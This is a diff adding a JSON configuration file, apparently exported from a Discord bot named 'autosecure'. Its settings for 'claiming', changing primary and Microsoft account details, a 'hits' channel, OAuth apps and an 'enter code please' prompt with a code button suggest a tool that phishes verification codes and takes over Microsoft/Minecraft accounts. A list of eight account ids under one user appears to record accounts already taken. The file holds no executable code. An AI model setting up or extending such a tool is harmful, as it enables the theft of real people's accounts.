@@ -1,0 +1,99 @@
+{
+  "config": {
+    "autosecure": [
+      {
+        "id": 72,
+        "server_id": "1267103088066428979",
+        "token": "",
+        "user_id": "1285310494143680626",
+        "aftersecure": "nothing",
+        "ping": "None",
+        "auto_secure": 1,
+        "change_ign": 0,
+        "multiplayer": 0,
+        "oauthapps": 1,
+        "oauth_link": null,
+        "logs_channel": "1332094776404611142|1267103088066428979",
+        "notification_channel": "1332094776404611142|1267103088066428979",
+        "hits_channel": "1332094776404611142|1267103088066428979",
+        "status": null,
+        "claiming": 1,
+        "changeprimary": 0,
+        "autosecureEnabled": 1,
+        "claimingresult": "full",
+        "domain": "tuff_future1.lol",
+        "secureifnomc": 0,
+        "addzyger": 0,
+        "verification_type": 0,
+        "current_panel": "features",
+        "microsoft_profile": null,
+        "changemicrosoft": 0,
+        "activity": null,
+        "sortingtype": "time_desc",
+        "users_channel": "1332094776404611142|1267103088066428979",
+        "hidenonmc": 0,
+        "checkban": 0
+      }
+    ],
+    "profiles": [],
+    "embeds": [],
+    "modals": [],
+    "buttons": [],
+    "users": [],
+    "email_notifier": [],
+    "blacklisted": [],
+    "quarantine": [],
+    "registeredemails": [],
+    "accountsbyuser": [
+      {
+        "user_id": "1285310494143680626",
+        "uid": "7889731765382894",
+        "time": "1742765386"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "8677401565662547",
+        "time": "1742765664"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "1265110865848389",
+        "time": "1742765888"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "1975978865967883",
+        "time": "1742765970"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "8614008266731775",
+        "time": "1742766754"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "3936158766857593",
+        "time": "1742766879"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "1659645667780080",
+        "time": "1742767815"
+      },
+      {
+        "user_id": "1285310494143680626",
+        "uid": "5495757034917158",
+        "time": "1742834919"
+      }
+    ],
+    "presets": [
+      {
+        "user_id": "1285310494143680626",
+        "name": "tuff_future1",
+        "preset": "{\"type\":\"rich\",\"description\":\"enter code please\",\"content_scan_version\":0}",
+        "codebutton": 1,
+        "TEXT": null
+      }
+    ]
+  }
+}
